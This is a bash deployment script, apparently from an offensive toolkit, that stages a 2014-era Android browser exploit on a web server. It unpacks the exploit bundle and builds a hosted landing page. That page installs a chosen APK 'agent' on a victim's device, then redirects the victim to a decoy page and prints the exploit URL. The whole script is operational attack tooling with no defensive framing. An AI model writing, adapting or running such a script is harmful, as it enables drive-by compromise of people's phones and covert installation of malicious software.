#!/bin/bash

if [ $# -lt 4 ]
then
#         --------------------------------------------------------------------------------
    echo "Usage: $0 webserver_dir ip redirect apk"
    echo ''
    echo "    webserver_dir: The subdirectory inside /docs/ where the exploit will be "
    echo '                   served from; e.g. if webserver_dir is "aaaaaa" the exploit '
    echo '                   landing page will be http://<IP>/docs/aaaaaa/fwd'
    echo '               ip: The webserver IP address'
    echo '         redirect: The page to redirect to in case of successful or unsuccessful'
    echo '                   exploitation'
    echo '              apk: The apk file to install'
    exit 1
fi

TMPDIR=`mktemp -d`
APKPATH=`readlink -f "$4"`

cd $TMPDIR
mkdir "/var/www/files/$1"
unzip /root/2014-004-AndroidBrowser.zip -d .
./build --type "androidhosted" --outdir "/var/www/files/$1" --serverip "$2" --basedir "docs/$1" --redirect "$3" --agent "$APKPATH" --output /tmp/test.uri --serveraddr example.com --expiry=`date -d "+7 days" "+%s"`

cd "/var/www/files/$1"
chown apache:apache *.ini
rm -fr $TMPDIR

echo "Exploit URI: http://$2/docs/$1/fwd"
